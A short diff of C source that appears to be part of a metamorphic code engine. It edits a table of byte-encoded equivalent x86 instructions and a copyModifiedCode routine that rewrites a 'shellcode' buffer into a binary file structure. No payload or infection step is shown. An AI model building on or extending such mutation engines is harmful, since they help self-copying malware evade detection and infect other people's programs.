@@ -573,9 +573,6 @@ static int8_t getRandomNbr(int8_t max) {
 }
 
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  "\x5d\xc3\x42", // pop rbp
-  "\xc9\xc3\x42", // leave
-  "\x42",
   "\x48\x89\xc6\x42", // mov rsi, rax
   "\x48\x8d\x30\x42", // lea rsi, [rax]
   "\x42",
@@ -629,11 +626,15 @@ static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
         j += 1;
       if (ins[j] != 0x42 ||
   ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
-        while (ins[0] != 0x42)
-          ins += MAX_INS_SIZE;
         ins += MAX_INS_SIZE;
+        if (ins[0] == 0x42)
+          ins += MAX_INS_SIZE;
         continue ;
       }
+      while (ins[0] != 0x42 && ins != (void *)copyModifiedCode - sizeof(instructions))
+        ins -= MAX_INS_SIZE;
+      if (ins[0] == 0x42)
+        ins += MAX_INS_SIZE;
       l = 0;
       while (ins[0] != 0x42) {
         l += 1;
